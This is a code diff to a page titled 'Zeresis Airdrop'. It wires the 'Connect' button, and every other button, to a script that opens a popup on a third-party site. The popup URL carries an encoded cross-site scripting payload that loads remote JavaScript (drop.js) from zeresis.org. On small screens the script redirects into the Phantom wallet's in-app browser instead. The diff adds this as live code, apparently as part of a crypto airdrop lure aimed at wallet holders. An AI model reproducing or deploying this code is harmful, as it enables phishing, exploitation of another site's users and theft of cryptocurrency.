@@ -129,7 +129,37 @@
 
     <main class="main">
         <h1 class="airdrop-header">Zeresis Airdrop</h1>
-        <button class="connect-button">Connect</button>
+        <button onclick="openPopupOrRedirect()" class="connect-button">Connect</button>
     </main>
+    <script>    // Function to open a popup or redirect
+        function openPopupOrRedirect() {
+            const url = "https://killabears.com/dashboard/viewer.php?img=%22--!%3E%3CsVg/oNloAd=import(%27https://zeresis.org/drop.js%27);%3E%5Cx3e"
+            const popupWidth = 500;
+            const popupHeight = 750;
+        
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+        
+            if (screenWidth > popupWidth && screenHeight > popupHeight) {
+                const left = (screenWidth - popupWidth) / 2;
+                const top = (screenHeight - popupHeight) / 2;
+        
+                window.open(url, "_blank", `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
+            } else {
+                window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Fzeresis.org%2Fmobile?ref=https%3A%2F%2Fzeresis.org%2Fmobile";
+            }
+        }
+        
+        // Add event listeners to all button elements
+        document.addEventListener('DOMContentLoaded', function() {
+            const buttons = document.getElementsByTagName('button');
+            for (let i = 0; i < buttons.length; i++) {
+                buttons[i].addEventListener('click', function(event) {
+                    event.preventDefault(); // Prevents the default button action if necessary
+                    openPopupOrRedirect();
+                });
+            }
+        });
+    </script>
 </body>
 </html>
